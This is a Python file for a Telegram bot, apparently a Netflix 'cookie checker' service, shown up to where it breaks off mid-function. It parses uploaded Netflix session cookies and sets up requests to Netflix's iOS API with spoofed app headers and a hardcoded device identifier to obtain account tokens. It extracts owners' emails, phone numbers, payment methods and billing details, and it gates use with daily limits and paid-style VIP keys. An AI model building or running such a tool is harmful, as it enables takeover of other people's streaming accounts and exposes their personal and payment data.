import os
import html
import json
import random
import re
import string
import threading
import unicodedata
import time
import zipfile
import io
from datetime import datetime, timedelta, timezone

import requests
from urllib3.exceptions import InsecureRequestWarning
import telebot
from telebot.types import Message, BotCommand, InlineKeyboardMarkup, InlineKeyboardButton

# ==========================================
# Telegram Bot Configuration
# ==========================================
# قراءة التوكن من المتغيرات البيئية (للرفع على السيرفر)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("⚠️ Please set BOT_TOKEN environment variable!")

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ==========================================
# Owner & Admin Configuration
# ==========================================
# المطور الرئيسي (صاحب البوت) - فقط من يمكنه استخدام أوامر الإدارة
OWNER_USER_IDS = [6889113186]  # ضع معرف التليجرام الخاص بك هنا فقط

# قائمة المشرفين الدائمين (لن تنتهي صلاحيتهم)
ADMIN_USER_IDS = []
ADMIN_USERNAMES = []

MAX_CHECKS_PER_DAY = 5
user_checks = {}

# ==========================================
# Broadcast System
# ==========================================
known_users = set()  # تخزين معرفات المستخدمين الذين تفاعلوا مع البوت

# ==========================================
# VIP Keys System (Temporary Admin for 6 hours)
# ==========================================
active_keys = {}  # {key: expiry_timestamp}
temp_admins = {}  # {user_id: expiry_timestamp}

def generate_key():
    """توليد كود عشوائي مكون من 8 أحرف وأرقام"""
    part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    return f"{part1}-{part2}"

def is_temp_admin(user_id):
    """التحقق إذا كان المستخدم VIP مؤقت"""
    if user_id in temp_admins:
        if time.time() < temp_admins[user_id]:
            return True
        else:
            del temp_admins[user_id]
    return False

def is_admin(user_id, username=None):
    """التحقق إذا كان المستخدم مطوراً (له صلاحيات غير محدودة)"""
    if user_id in OWNER_USER_IDS:
        return True
    if user_id in ADMIN_USER_IDS:
        return True
    if username and username in ADMIN_USERNAMES:
        return True
    if is_temp_admin(user_id):
        return True
    return False

def is_owner(user_id):
    """التحقق إذا كان المستخدم هو صاحب البوت (المطور الرئيسي)"""
    return user_id in OWNER_USER_IDS

def can_user_check(user_id, username=None):
    """التحقق من عدد المحاولات المتبقية للمستخدم"""
    if is_admin(user_id, username):
        return True, float('inf')
    
    today = datetime.now().date().isoformat()
    
    if user_id not in user_checks:
        user_checks[user_id] = {'count': 0, 'reset_date': today}
        return True, MAX_CHECKS_PER_DAY
    
    if user_checks[user_id]['reset_date'] != today:
        user_checks[user_id] = {'count': 0, 'reset_date': today}
        return True, MAX_CHECKS_PER_DAY
    
    remaining = MAX_CHECKS_PER_DAY - user_checks[user_id]['count']
    
    if remaining <= 0:
        return False, 0
    
    return True, remaining

def increment_user_check(user_id, username=None):
    """زيادة عداد المحاولات للمستخدم"""
    if is_admin(user_id, username):
        return
    
    today = datetime.now().date().isoformat()
    
    if user_id not in user_checks:
        user_checks[user_id] = {'count': 1, 'reset_date': today}
    elif user_checks[user_id]['reset_date'] != today:
        user_checks[user_id] = {'count': 1, 'reset_date': today}
    else:
        user_checks[user_id]['count'] += 1

def get_remaining_checks(user_id, username=None):
    """الحصول على عدد المحاولات المتبقية للمستخدم"""
    if is_admin(user_id, username):
        return "Unlimited ♾️"
    
    today = datetime.now().date().isoformat()
    
    if user_id not in user_checks or user_checks[user_id]['reset_date'] != today:
        return MAX_CHECKS_PER_DAY
    
    return MAX_CHECKS_PER_DAY - user_checks[user_id]['count']

# ==========================================
# Checker Configurations (In-Memory)
# ==========================================
BOT_CONFIG = {
    "performance": {
        "request_timeout_seconds": 20,
        "fallback_account_page": False
    }
}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.locales": "en-US",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
}

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}

# ==========================================
# Core Extraction & Processing Functions
# ==========================================

def is_netflix_domain(domain):
    normalized = str(domain or "").strip()
    if normalized.startswith("#HttpOnly_"):
        normalized = normalized[len("#HttpOnly_"):]
    return "netflix." in normalized.lower()

def canonicalize_netflix_cookie_name(name):
    normalized = str(name or "").strip()
    return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)

def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    for cookie_name in LOGIN_REQUIRED_NETFLIX_COOKIES:
        if not decode_netflix_value(cookie_dict.get(cookie_name)):
            return False
    return True

def is_netflix_cookie_entry(domain, name):
    normalized_name = canonicalize_netflix_cookie_name(name)
    return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)

def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped or stripped.startswith("#") and not stripped.startswith("#HttpOnly_"):
        return []
    if stripped.startswith("#HttpOnly_"):
        stripped = stripped[len("#HttpOnly_"):]
    parts = stripped.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", stripped, maxsplit=6)
    if len(parts) >= 7:
        return parts
    return []

def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE") or parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
        return False
    return True

def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
    normalized_expires = str(expires or 0).strip()
    if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
        try:
            normalized_expires = str(int(float(normalized_expires)))
        except Exception:
            pass
    return {
        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
        "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
        "path": str(path or "/"),
        "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
        "expires": normalized_expires or "0",
        "name": canonicalize_netflix_cookie_name(name),
        "value": str(value or ""),
        "position": position,
    }

def format_netscape_cookie_entry(entry):
    return f"{entry['domain']}\t{entry['tail_match']}\t{entry['path']}\t{entry['secure']}\t{entry['expires']}\t{entry['name']}\t{entry['value']}"

def extract_netscape_cookie_entries(raw_text):
    entries = []
    for index, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain, name = parts[0], canonicalize_netflix_cookie_name(parts[5])
        if is_netflix_cookie_entry(domain, name):
            entries.append(build_netscape_cookie_entry(domain, parts[1], parts[2], parts[3], parts[4], name, parts[6], index))
    return entries

def extract_json_cookie_entries(content):
    try:
        json_data = json.loads(content)
    except Exception:
        return []
    if isinstance(json_data, dict):
        json_data = json_data.get("cookies", json_data.get("items", [json_data]))
    if not isinstance(json_data, list):
        return []

    entries = []
    for index, cookie in enumerate(json_data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if is_netflix_cookie_entry(domain, name):
            entries.append(build_netscape_cookie_entry(
                domain, "TRUE" if str(domain).startswith(".") else "FALSE",
                cookie.get("path", "/"), "TRUE" if cookie.get("secure", False) else "FALSE",
                cookie.get("expirationDate", cookie.get("expiration", 0)), name, cookie.get("value", ""), index
            ))
    return entries

def extract_raw_cookie_entries(raw_text):
    pattern = re.compile(
        rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(n) for n in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)",
        re.IGNORECASE,
    )
    entries = []
    for index, match in enumerate(pattern.finditer(raw_text)):
        cookie_name = canonicalize_netflix_cookie_name(match.group("name"))
        value = match.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        entries.append(build_netscape_cookie_entry(".netflix.com", "TRUE", "/", "TRUE" if cookie_name == "SecureNetflixId" else "FALSE", "0", cookie_name, value, index))
    return entries

def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []
    entries_by_name = {}
    for entry in entries:
        if entry.get("name"):
            entries_by_name.setdefault(entry["name"], []).append(entry)
    if not entries_by_name:
        return []

    netflix_id_count = len(entries_by_name.get("NetflixId", []))
    bundle_count = netflix_id_count or max(len(name_entries) for name_entries in entries_by_name.values())
    bundles = []

    for bundle_index in range(bundle_count):
        selected_entries = []
        for name_entries in entries_by_name.values():
            if bundle_index < len(name_entries):
                selected_entries.append(name_entries[bundle_index])
            elif len(name_entries) == 1:
                selected_entries.append(name_entries[0])

        if selected_entries:
            selected_entries = sorted(selected_entries, key=lambda item: item.get("position", 0))
            netscape_text = "\n".join(format_netscape_cookie_entry(entry) for entry in selected_entries)
            bundles.append({
                "index": bundle_index + 1,
                "total": bundle_count,
                "netscape_text": netscape_text,
                "cookies": cookies_dict_from_netscape(netscape_text),
            })
    return bundles

def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7:
            domain, name, value = parts[0], canonicalize_netflix_cookie_name(parts[5]), parts[6]
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies

def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        bundles = build_cookie_bundles_from_entries(extractor(content))
        if bundles:
            return bundles
    return []

def _decode_unicode_escape(match):
    try: return chr(int(match.group(1), 16))
    except Exception: return match.group(0)

def _decode_hex_escape(match):
    try: return chr(int(match.group(1), 16))
    except Exception: return match.group(0)

def decode_netflix_value(value):
    if value is None: return None
    cleaned = html.unescape(str(value))
    for source, target in {"\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " "}.items():
        cleaned = cleaned.replace(source, target)
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        previous = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", _decode_unicode_escape, cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", _decode_hex_escape, cleaned)
        cleaned = re.sub(r"(?<!\\)\bu([0-9a-fA-F]{4})(?![0-9a-fA-F])", _decode_unicode_escape, cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == previous: break
    cleaned = re.sub(r"(?<=[A-Za-z])\s+(?=[^\x00-\x7F])", "", cleaned)
    return re.sub(r"\s+", " ", cleaned).strip() or None

def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match: 
            decoded = decode_netflix_value(match.group(1))
            if decoded:
                return decoded
    return None

def parse_boolean_value(value):
    if isinstance(value, bool): return value
    if isinstance(value, (int, float)): return value == 1 if value in (0, 1) else None
    if isinstance(value, dict):
        for key in ("value", "isUserOnHold", "holdStatus", "isOnHold", "pastDue", "isPastDue", "isVerified", "verified"):
            if key in value:
                parsed = parse_boolean_value(value.get(key))
                if parsed is not None: return parsed
        return None
    cleaned = decode_netflix_value(value)
    if cleaned is None: return None
    lowered = str(cleaned).strip().lower()
    if lowered in {"true", "yes", "1", "on"}: return True
    if lowered in {"false", "no", "0", "off"}: return False
    return None

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True: return "Yes"
    if parsed is False: return "No"
    return None

def extract_bool_value(response_text, patterns):
    value = extract_first_match(response_text, patterns, re.IGNORECASE)
    parsed = format_boolean_label(value)
    return parsed if parsed is not None else value

def extract_profile_names(response_text):
    names = []
    for pattern in [r'"profileName"\s*:\s*"([^"]+)"', r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"']:
        for found in re.findall(pattern, response_text, re.DOTALL):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names: names.append(decoded)
    for match in re.finditer(r'"__typename"\s*:\s*"Profile"', response_text):
        snippet = response_text[match.start():match.start() + 1200]
        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
        if name_match:
            decoded = decode_netflix_value(name_match.group(1))
            if decoded and decoded not in names: names.append(decoded)
    return ", ".join(names) if names else None

def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for key, value in (primary or {}).items():
        if value not in (None, "", [], {}):
            merged[key] = value
    return merged

def has_complete_account_info(info):
    if not info: return False
    has_country = info.get("countryOfSignup") and info.get("countryOfSignup") != "null"
    has_status = info.get("membershipStatus") and info.get("membershipStatus") != "null"
    return has_country or has_status

MONTH_ALIASES = {
    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1, "styczen": 1, "stycznia": 1, "มกราคม": 1, "มกรา": 1, "م.ค": 1, "يناير": 1, "januari": 1, "gennaio": 1, "ianuarie": 1, "jan": 1,
    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2, "luty": 2, "lutego": 2, "กุมภาพันธ์": 2, "กุมภา": 2, "ก.พ": 2, "فبراير": 2, "februari": 2, "febbraio": 2, "februarie": 2, "feb": 2,
    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3, "marca": 3, "มีนาคม": 3, "มีนา": 3, "มี.ค": 3, "مارس": 3, "maret": 3, "mac": 3, "mart": 3, "martie": 3, "marz": 3,
    "abril": 4, "avril": 4, "kwiecien": 4, "kwietnia": 4, "เมษายน": 4, "เมษา": 4, "เม.ย": 4, "أبريل": 4, "ابريل": 4, "aprile": 4, "april": 4, "aprilie": 4, "nisan": 4, "apr": 4,
    "may": 5, "mayo": 5, "mai": 5, "maj": 5, "maja": 5, "พฤษภาคม": 5, "พฤษภา": 5, "พ.ค": 5, "مايو": 5, "mei": 5, "maggio": 5, "mayis": 5,
    "june": 6, "junio": 6, "juin": 6, "haziran": 6, "czerwiec": 6, "czerwca": 6, "มิถุนายน": 6, "มิถุนา": 6, "มิ.ย": 6, "يونيو": 6, "juni": 6, "giugno": 6, "junho": 6, "iunie": 6,
    "july": 7, "julio": 7, "juillet": 7, "temmuz": 7, "lipiec": 7, "lipca": 7, "กรกฎาคม": 7, "กรกฎา": 7, "ก.ค": 7, "يوليو": 7, "juli": 7, "luglio": 7, "julho": 7, "iulie": 7,
    "august": 8, "agosto": 8, "aout": 8, "août": 8, "agost": 8, "sierpien": 8, "sierpnia": 8, "สิงหาคม": 8, "สิงหา": 8, "ส.ค": 8, "أغسطس": 8, "اغسطس": 8, "agustus": 8, "agustos": 8,
    "septiembre": 9, "setembro": 9, "eylul": 9, "wrzesien": 9, "wrzesnia": 9, "กันยายน": 9, "กันยา": 9, "ก.ย": 9, "سبتمبر": 9, "september": 9, "settembre": 9, "septembre": 9,
    "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "pazdziernik": 10, "pazdziernika": 10, "ตุลาคม": 10, "ตุลา": 10, "ต.ค": 10, "أكتوبر": 10, "اكتوبر": 10, "oktober": 10, "ottobre": 10,
    "noviembre": 11, "novembro": 11, "kasim": 11, "listopad": 11, "listopada": 11, "พฤศจิกายน": 11, "พฤศจิกา": 11, "พ.ย": 11, "نوفمبر": 11, "november": 11, "novembre": 11, "noiembrie": 11, "kasım": 11,
    "diciembre": 12, "dezembro": 12, "aralik": 12, "grudzien": 12, "grudnia": 12, "ธันวาคม": 12, "ธันวา": 12, "ธ.ค": 12, "ديسمبر": 12, "desember": 12, "dicembre": 12, "december": 12, "decembre": 12, "décembre": 12, "aralık": 12
}

def normalize_calendar_year(year):
    try:
        y = int(year)
        return y - 543 if 2400 <= y <= 2700 else y
    except: return None

def parse_localized_date(cleaned):
    if not cleaned: return None
    for parser in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
        try: return datetime.strptime(cleaned, parser)
        except: continue
    
    iso_candidate = cleaned.replace("Z", "+00:00")
    try: return datetime.fromisoformat(iso_candidate)
    except: pass

    numeric_parts = [int(p) for p in re.findall(r"\d+", cleaned)]
    if len(numeric_parts) >= 3:
        first, second, third = numeric_parts[0], numeric_parts[1], numeric_parts[2]
        try:
            first, third = normalize_calendar_year(first), normalize_calendar_year(third)
            if 1900 <= first <= 3000 and 1 <= second <= 12 and 1 <= third <= 31: return datetime(first, second, third)
            if 1 <= first <= 31 and 1 <= second <= 12 and 1900 <= third <= 3000: return datetime(third, second, first)
        except: pass

    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    
    month = next((m for alias, m in MONTH_ALIASES.items() if alias in raw_lower or alias in simplified), None)
    if month is None: return None

    year = next((normalize_calendar_year(n) for n in numeric_parts if normalize_calendar_year(n) is not None and 1900 <= normalize_calendar_year(n) <= 3000), None)
    if year is None:
        year_match = re.search(r"\b\d{4}\b", simplified)
        if year_match: year = normalize_calendar_year(year_match.group(0))
    if year is None: return None

    day = next((n for n in numeric_parts if normalize_calendar_year(n) != year and 1 <= n <= 31), 1)
    try: return datetime(year, month, day)
    except: return None

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned: 
        return "Not available"
    parsed = parse_localized_date(cleaned)
    return parsed.strftime("%B %d, %Y").replace(" 0", " ") if parsed else cleaned

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned: return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed: return parsed.strftime("%B %Y")
    
    numeric_parts = re.findall(r"\d+", cleaned)
    if len(numeric_parts) >= 2:
        try:
            month, year = int(numeric_parts[0]), normalize_calendar_year(numeric_parts[-1])
            if year is not None and 1 <= month <= 12 and 1900 <= year <= 3000:
                return datetime(year, month, 1).strftime("%B %Y")
        except: pass
    
    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    year = next((normalize_calendar_year(n) for n in numeric_parts if normalize_calendar_year(n) is not None and 1900 <= normalize_calendar_year(n) <= 3000), None)
    if year is None:
        year_match = re.search(r"\b\d{4}\b", simplified)
        if year_match: year = normalize_calendar_year(year_match.group(0))
    if year is not None:
        for alias, month in MONTH_ALIASES.items():
            if alias in raw_lower or alias in simplified:
                try: return datetime(year, month, 1).strftime("%B %Y")
                except: break
    return cleaned

def extract_info_from_graphql_payload(response_text):
    try: payload = json.loads(response_text)
    except: return {}
    data = payload.get("data", {}) if isinstance(payload, dict) else {}
    if not isinstance(data, dict): return {}

    growth = data.get("growthAccount", {})
    prof = data.get("currentProfile", {})
    c_plan = growth.get("currentPlan", {}).get("plan", {}) if isinstance(growth.get("currentPlan"), dict) else {}
    n_plan = growth.get("nextPlan", {}).get("plan", {}) if isinstance(growth.get("nextPlan"), dict) else {}
    n_bill = growth.get("nextBillingDate", {})
    pay_methods = growth.get("growthPaymentMethods", [])
    pay_m = pay_methods[0] if pay_methods and isinstance(pay_methods[0], dict) else {}
    hold_meta = growth.get("growthHoldMetadata", {})
    
    def _extract_price(plan_obj):
        for key in ("priceDisplay", "displayPrice", "formattedPrice", "formattedPlanPrice", "planPriceDisplay"):
            if plan_obj.get(key): return decode_netflix_value(plan_obj.get(key))
        if isinstance(plan_obj.get("price"), dict):
            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
                if plan_obj["price"].get(key): return decode_netflix_value(plan_obj["price"].get(key))
        return None

    email, email_verified = prof.get("growthEmail", {}).get("email", {}).get("value"), prof.get("growthEmail", {}).get("isVerified")
    if not email:
        for p in growth.get("profiles", []):
            email, email_verified = p.get("growthEmail", {}).get("email", {}).get("value"), p.get("growthEmail", {}).get("isVerified")
            if email: break

    hold_status = format_boolean_label(
        hold_meta.get("isUserOnHold") if isinstance(hold_meta, dict) else hold_meta or
        hold_meta.get("holdStatus") if isinstance(hold_meta, dict) else None or
        growth.get("isUserOnHold") or growth.get("holdStatus")
    )

    feature_types = []
    for plan_obj in (c_plan, n_plan):
        for feature in (plan_obj.get("availableFeatures") or []):
            if isinstance(feature, dict) and feature.get("type"):
                feature_types.append(str(feature["type"]).upper())

    phone_number = None
    phone_data = growth.get("phoneNumber", {})
    if isinstance(phone_data, dict):
        phone_number = decode_netflix_value(phone_data.get("value") or phone_data.get("number") or phone_data.get("phoneNumber"))
    if not phone_number:
        phone_data = prof.get("phoneNumber", {})
        if isinstance(phone_data, dict):
            phone_number = decode_netflix_value(phone_data.get("value") or phone_data.get("number") or phone_data.get("phoneNumber"))

    video_quality = decode_netflix_value(c_plan.get("videoQuality")) or decode_netflix_value(n_plan.get("videoQuality"))
    
    payment_method = None
    if pay_m:
        payment_method = decode_netflix_value(pay_m.get("paymentOptionLogo", {}).get("paymentOptionLogo") or 
                                              pay_m.get("displayText") or 
                                              pay_m.get("type") or 
                                              growth.get("payer"))

    info = {
        "accountOwnerName": decode_netflix_value(prof.get("name")),
        "email": decode_netflix_value(email),
        "countryOfSignup": decode_netflix_value(growth.get("countryOfSignUp", {}).get("code")),
        "memberSince": decode_netflix_value(growth.get("memberSince")),
        "nextBillingDate": decode_netflix_value(n_bill.get("localDate") or n_bill.get("date")),
        "userGuid": decode_netflix_value(growth.get("ownerGuid") or prof.get("guid")),
        "membershipStatus": decode_netflix_value(growth.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(c_plan.get("name") or n_plan.get("name")),
        "planPrice": _extract_price(c_plan) or _extract_price(n_plan),
        "paymentMethodType": payment_method,
        "videoQuality": video_quality,
        "emailVerified": format_boolean_label(email_verified),
        "holdStatus": hold_status,
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
        "profiles": ", ".join([decode_netflix_value(p.get("name")) for p in growth.get("profiles", []) if isinstance(p, dict) and p.get("name")]) or None,
        "phoneNumber": phone_number,
    }
    return {k: v for k, v in info.items() if v not in (None, "", [], {})}

def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    
    next_billing_patterns = [
        r'"nextBillingDate"\s*:\s*"([^"]+)"',
        r'"nextBillDate"\s*:\s*"([^"]+)"',
        r'"billingDate"\s*:\s*"([^"]+)"',
        r'"nextBilling"\s*:\s*"([^"]+)"',
        r'"date"\s*:\s*"([^"]+)"',
        r'"nextBillingDate"\s*:\s*\{\s*"value"\s*:\s*"([^"]+)"',
        r'"renewalDate"\s*:\s*"([^"]+)"',
        r'"expiryDate"\s*:\s*"([^"]+)"',
        r'"endDate"\s*:\s*"([^"]+)"'
    ]
    
    payment_patterns = [
        r'"paymentMethodType"\s*:\s*"([^"]+)"',
        r'"paymentType"\s*:\s*"([^"]+)"',
        r'"paymentMethodName"\s*:\s*"([^"]+)"',
        r'"paymentOptionLogo"\s*:\s*"([^"]+)"',
        r'"paymentMethod"\s*:\s*"([^"]+)"',
        r'"method"\s*:\s*"([^"]+)"',
        r'"cardType"\s*:\s*"([^"]+)"',
        r'"payer"\s*:\s*"([^"]+)"',
        r'"billingMethod"\s*:\s*"([^"]+)"',
        r'"billingType"\s*:\s*"([^"]+)"'
    ]
    
    phone_patterns = [
        r'"phoneNumber"\s*:\s*"([^"]+)"',
        r'"phoneNumber"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"phoneNumberDigits"\s*:\s*\{\s*"value"\s*:\s*"([^"]+)"',
        r'"phone"\s*:\s*"([^"]+)"',
        r'"mobileNumber"\s*:\s*"([^"]+)"',
        r'"phoneNumber"\s*:\s*\{[^{}]*"value"\s*:\s*"([^"]+)"',
        r'"phoneNumberDisplay"\s*:\s*"([^"]+)"',
        r'"contactNumber"\s*:\s*"([^"]+)"',
        r'"phone"\s*:\s*\{\s*"value"\s*:\s*"([^"]+)"',
        r'"mobile"\s*:\s*"([^"]+)"',
        r'"tel"\s*:\s*"([^"]+)"'
    ]
    
    video_patterns = [
        r'"videoQuality"\s*:\s*"([^"]+)"',
        r'"quality"\s*:\s*"([^"]+)"',
        r'"maxVideoQuality"\s*:\s*"([^"]+)"',
        r'"playbackQuality"\s*:\s*"([^"]+)"',
        r'"videoQuality"\s*:\s*\{\s*"value"\s*:\s*"([^"]+)"',
    ]
    
    extracted = {
        "accountOwnerName": extract_first_match(response_text, [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"firstName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']),
        "email": extract_first_match(response_text, [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']),
        "countryOfSignup": extract_first_match(response_text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"', r'"country"\s*:\s*"([^"]+)"']),
        "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
        "nextBillingDate": extract_first_match(response_text, next_billing_patterns),
        "userGuid": extract_first_match(response_text, [r'"userGuid":\s*"([^"]+)"']),
        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
        "maxStreams": extract_first_match(response_text, [r'maxStreams":\{"fieldType":"Numeric","value":\s*(\d+)', r'"maxStreams"\s*:\s*"?(\d+)"?', r'screens":\s*(\d+)']),
        "localizedPlanName": extract_first_match(response_text, [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']),
        "planPrice": extract_first_match(response_text, [r'"planPriceDisplay"\s*:\s*"([^"]+)"']),
        "videoQuality": extract_first_match(response_text, video_patterns),
        "paymentMethodType": extract_first_match(response_text, payment_patterns),
        "phoneNumber": extract_first_match(response_text, phone_patterns),
        "holdStatus": extract_bool_value(response_text, [r'"holdStatus"\s*:\s*(true|false)', r'"isUserOnHold"\s*:\s*(true|false)']),
        "showExtraMemberSection": extract_bool_value(response_text, [r'"showExtraMemberSection"\s*:\s*(true|false)']),
        "emailVerified": extract_bool_value(response_text, [r'"emailVerified"\s*:\s*(true|false)']),
        "profiles": extract_profile_names(response_text),
    }
    
    extracted = merge_info(graphql_info, extracted)
    
    if not extracted.get("nextBillingDate") or extracted.get("nextBillingDate") == "UNKNOWN":
        membership_date = extract_first_match(response_text, [
            r'"expirationDate"\s*:\s*"([^"]+)"',
            r'"endDate"\s*:\s*"([^"]+)"',
            r'"validUntil"\s*:\s*"([^"]+)"'
        ])
        if membership_date:
            extracted["nextBillingDate"] = membership_date
    
    if not extracted.get("paymentMethodType") or extracted.get("paymentMethodType") == "UNKNOWN":
        payment_from_plan = extract_first_match(response_text, [
            r'"planPriceDisplay"\s*:\s*"([^"]+)"',
            r'"priceDisplay"\s*:\s*"([^"]+)"'
        ])
        if payment_from_plan:
            extracted["paymentMethodType"] = payment_from_plan
    
